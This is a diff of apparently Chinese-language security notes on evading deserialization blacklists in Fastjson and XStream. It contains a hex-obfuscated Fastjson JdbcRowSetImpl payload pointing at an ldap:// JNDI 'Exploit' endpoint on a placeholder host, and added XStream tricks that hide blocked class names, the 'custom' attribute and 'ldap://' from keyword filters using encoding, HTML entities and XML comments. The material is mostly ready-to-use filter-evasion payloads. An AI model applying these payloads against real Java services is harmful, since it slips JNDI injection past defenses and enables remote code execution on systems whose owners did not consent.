@@ -28,3 +28,44 @@ yaml的双引号中可以使用16进制编码和unicode编码，
 {"name":{"\x40\x74\x79\x70\x65":"java.lang.Class","val":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c"},"x":{"\x40\x74\x79\x70\x65":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"ldap://xxx.xxx.xxx.xxxs:1389/Exploit","\x61\x75\x74\x6f\x43\x6f\x6d\x6d\x69\x74":true}}
 
 ```
+2021/10/7更新
+### XStream
+```xml
+1. 16进制绕过
+
+<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+当前黑名单为org[.]springframework，此时的绕过方法可以为
+<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+</org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+
+2. 针对标签属性内容的绕过
+
+<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="custom">
+</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+此时的黑名单为custom，那么绕过方法可以为
+
+<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">
+</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
+原理为读取属性内容时，会做符合要求的转化
+
+3. 针对标签内容的绕过
+<test>
+ldap://xxxxx
+</test>
+此时的黑名单为ldap://，可以用如下的几种方法绕过
+
+html编码:
+这部分在提取数据时，同样对html编码的内容做了转化
+<test>
+&#108;dap://xxxxx
+</test>
+
+注释的方法:
+在处理实际的标签内容时，遇到注视内容将被忽略掉
+<test>
+ld<!-- test -->ap://xxxxx
+</test>
+
+
+```
